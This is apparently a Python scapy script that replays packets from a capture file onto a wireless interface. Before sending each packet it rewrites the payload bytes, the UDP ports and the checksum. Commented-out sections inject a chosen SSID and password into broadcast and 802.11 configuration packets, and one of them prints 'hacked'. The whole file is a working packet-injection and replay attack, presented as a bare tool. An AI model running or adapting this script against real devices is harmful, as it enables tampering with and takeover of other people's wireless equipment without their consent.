#!/usr/bin/python
from scapy.all import *
import time, sys
pkts = rdpcap(sys.argv[1])
clk = pkts[0].time
for p in pkts:
   org_byte = p[Raw].load
   old_bytes = b":2"
   new_bytes = b":1"
   org_byte_rep = org_byte.replace(old_bytes, new_bytes)
   
   print(org_byte)
   print(org_byte_rep)
   p[0][UDP].sport=int(sys.argv[2])
   p[0][UDP].dport= int(sys.argv[3])
   p[0][UDP].chksum=0x869c
   p[Raw].load=org_byte_rep
   #time.sleep(float((p.time - clk)/1))
   #clk = p.time
   time.sleep(1/10)
   #if p.haslayer(IP) and p.haslayer(Raw):
   #if p.haslayer(Dot11Elt[2]) and p[RadioTap].mac_timestamp==4013760052:
   		#	if (p[IP].src=='192.168.43.2' and p[IP].dst=='192.168.43.255'):
		#			if p.haslayer(UDP):
		#				print(p)
		#				t=p[Raw].load.split("{")
		#				print(t)
		#				p1=t[1].split(",")
		#				print(p1[2])
			#			sport_new=p[UDP].sport
			#	        	print(sport_new)
			#			k=p[Dot11].SC
		        #               	p[Dot11].SC=k+32
			#			print(k)
		#				p[Raw].load=t[0]+"{"+"\"passwd\":\"cebh1234\""+","+p1[1]+","+"\"ssid\":\"cyberes\""+","+p1[3]
   #if p.haslayer(Dot11Elt[2]) and p[RadioTap].mac_timestamp==4013760052:
	#					print(p)
	##					print(t)
	#					p1=t[1].split(",")
	#					print(p1[2])
	#					p[Dot11Elt][2].info=t[0]+"{"+"\"passwd\":\"cebh1234\""+","+p1[1]+","+"\"ssid\":\"cyberes\""+","+p1[3]
   #if p[RadioTap].mac_timestamp==79328385621:
#	#p[Raw].load="set_WIFI1::ssid=cyberes;pass=cebh1234;\n"
 #       print("hacked")
   sendp(p,iface="wlx00117f1bf2cb")

